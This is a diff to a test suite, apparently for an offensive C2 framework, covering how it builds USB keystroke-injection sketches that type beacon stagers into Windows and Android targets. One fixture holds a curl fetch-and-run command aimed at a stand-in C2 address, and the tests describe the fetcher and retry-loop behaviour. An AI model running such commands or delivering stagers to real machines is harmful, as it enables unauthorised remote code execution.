@@ -53,6 +53,10 @@ def _errors(note):
     return " ".join(str(c) for c in note.error.call_args_list)
 
 
+def _warns(note):
+    return " ".join(str(c) for c in note.warn.call_args_list)
+
+
 def _typed_from_sketch(content):
     """The command an Arduino sketch actually types, unescaped."""
     line = next(ln for ln in content.splitlines() if "Keyboard.print(F(" in ln)
@@ -204,31 +208,30 @@ class TestFromPayloadHonoursTheMode:
         # the premise: without the flag, --from-payload types 11.4k chars
         assert len(self._entry()["command"]) > 5000
 
-    def test_alone_it_still_types_the_registered_command(self, tmp_path,
-                                                         monkeypatch):
-        """The baseline contract of --from-payload, kept on purpose."""
+    def test_the_default_is_the_short_fetcher(self, tmp_path, monkeypatch):
+        """No flag at all: reusing a payload is how HID is used."""
         self._inventory(monkeypatch)
         content, _ = _run_hid("pico --from-payload 3f2a91c4 --type-into "
                               "windows", tmp_path)
         assert content is not None
-        assert " -Enc " in content, (
-            "--from-payload without --stager-mode types the command that "
-            "already exists; download there is available, not assumed")
-
-    def test_download_is_honoured_when_asked_for(self, tmp_path, monkeypatch):
-        self._inventory(monkeypatch)
-        content, _ = _run_hid("pico --from-payload 3f2a91c4 --type-into "
-                              "windows --stager-mode download", tmp_path)
-        assert content is not None, (
-            "asking for download must reach the short fetcher, not be ignored")
-        assert " -Enc " not in content, "the 11.4k registered command was typed"
         assert "/s/windows" in content
+        assert " -Enc " not in content, (
+            "the default still typed the 11.4k registered command")
+
+    def test_the_default_matches_asking_for_it(self, tmp_path, monkeypatch):
+        self._inventory(monkeypatch)
+        implicit, _ = _run_hid("pico --from-payload 3f2a91c4 --type-into "
+                               "windows", tmp_path, name="implicit")
+        explicit, _ = _run_hid("pico --from-payload 3f2a91c4 --type-into "
+                               "windows --stager-mode download", tmp_path,
+                               name="explicit")
+        assert implicit == explicit
 
     def test_the_download_command_fits_the_hid_budget(self, tmp_path,
                                                     monkeypatch):
         self._inventory(monkeypatch)
         content, _ = _run_hid("arduino --from-payload 3f2a91c4 --type-into "
-                              "windows --stager-mode download", tmp_path)
+                              "windows", tmp_path)
         assert content is not None
         typed = _typed_from_sketch(content)
         assert len(typed) < LEGACY_LIMIT, len(typed)
@@ -239,7 +242,7 @@ class TestFromPayloadHonoursTheMode:
         """A payload built for ANOTHER listener must keep pointing there."""
         self._inventory(monkeypatch)
         content, _ = _run_hid("pico --from-payload 3f2a91c4 --type-into "
-                              "windows --stager-mode download", tmp_path)
+                              "windows", tmp_path)
         assert content is not None
         assert f"{self.REGISTERED_HOST}:{PORT}" in content
         from phantom.modules.payload import PayloadModule
@@ -253,7 +256,7 @@ class TestFromPayloadHonoursTheMode:
                                                              monkeypatch):
         self._inventory(monkeypatch, use_ssl=False)
         content, _ = _run_hid("pico --from-payload 3f2a91c4 --type-into "
-                              "windows --stager-mode download", tmp_path)
+                              "windows", tmp_path)
         assert content is not None
         assert "http://" in content
         assert "https://" not in content
@@ -267,6 +270,7 @@ class TestFromPayloadHonoursTheMode:
 
     def test_a_command_without_a_readable_endpoint_is_refused(self, tmp_path,
                                                               monkeypatch):
+        """ASKING for a fetcher a command cannot back is an error."""
         monkeypatch.setattr(
             "phantom.utils.payload_manager.get_custom_beacons",
             lambda: [{"id": "3f2a91c4-1111-2222-3333-444455556666",
@@ -276,6 +280,38 @@ class TestFromPayloadHonoursTheMode:
                                  "windows --stager-mode download", tmp_path)
         assert content is None
         assert "carries no C2 endpoint" in _errors(note)
+
+    def test_an_entry_with_no_endpoint_falls_back_loudly(self, tmp_path,
+                                                        monkeypatch):
+        """The DEFAULT must never dead-end on a hand-made entry."""
+        monkeypatch.setattr(
+            "phantom.utils.payload_manager.get_custom_beacons",
+            lambda: [{"id": "3f2a91c4-1111-2222-3333-444455556666",
+                      "platform": "windows", "command": "echo hello",
+                      "description": "hand made"}])
+        content, note = _run_hid("pico --from-payload 3f2a91c4 --type-into "
+                                 "windows", tmp_path)
+        assert content is not None, "the default must still deliver"
+        assert "echo hello" in content
+        warning = _warns(note)
+        assert "AS REGISTERED" in warning, warning
+        assert "--stager-mode inline" in warning      # the explicit way out
+        assert not note.error.called
+
+    def test_an_android_payload_falls_back_and_says_why(self, tmp_path,
+                                                       monkeypatch):
+        """Android is an HTTP channel: named, not silently mis-typed."""
+        entry = {"id": "3f2a91c4-1111-2222-3333-444455556666",
+                 "platform": "android",
+                 "command": "bash -c \"$(curl -sk 'https://10.9.9.9:8443/"
+                            "s/android')\"",
+                 "description": "android stager"}
+        monkeypatch.setattr("phantom.utils.payload_manager.get_custom_beacons",
+                            lambda: [entry])
+        content, note = _run_hid("pico --from-payload 3f2a91c4 --type-into "
+                                 "android", tmp_path)
+        assert content is not None
+        assert "HTTP channel, not HID" in _warns(note)
 
     def test_reading_the_endpoint_out_of_both_registered_shapes(self):
         for platform in ("windows", "linux", "macos"):
@@ -336,9 +372,9 @@ class TestFlagsThatCannotTakeEffectAreErrors:
         assert content is not None
         assert "while($i -lt 7)" in content
 
-    def test_an_attempt_budget_on_a_from_payload_with_no_mode(self, tmp_path,
+    def test_the_attempt_budget_reaches_a_from_payload_stager(self, tmp_path,
                                                              monkeypatch):
-        """A budget the typed command cannot honour is an error, not a shrug."""
+        """A budget the default CAN honour has to reach the typed command."""
         monkeypatch.setattr(
             "phantom.utils.payload_manager.get_custom_beacons",
             lambda: [{"id": "3f2a91c4-1111-2222-3333-444455556666",
@@ -349,6 +385,21 @@ class TestFlagsThatCannotTakeEffectAreErrors:
                       "description": "Custom C++ Beacon (x64)"}])
         content, note = _run_hid("pico --from-payload 3f2a91c4 --type-into "
                                  "windows --stager-attempts 5", tmp_path)
+        assert content is not None
+        assert "while($i -lt 5)" in content
+        assert not note.error.called
+
+    def test_an_attempt_budget_on_a_command_with_no_loop_is_an_error(
+            self, tmp_path, monkeypatch):
+        """Asking for a bounded retry on a command that cannot retry."""
+        monkeypatch.setattr(
+            "phantom.utils.payload_manager.get_custom_beacons",
+            lambda: [{"id": "3f2a91c4-1111-2222-3333-444455556666",
+                      "platform": "windows", "command": "echo hello",
+                      "description": "hand made"}])
+        content, note = _run_hid("pico --from-payload 3f2a91c4 --type-into "
+                                 "windows --stager-attempts 5", tmp_path)
         assert content is None, (
             "the registered command has no retry loop to bound")
-        assert "--stager-mode download" in _errors(note)
+        assert "carries no C2 endpoint" in _errors(note)
+        assert "--stager-mode inline" in _errors(note)
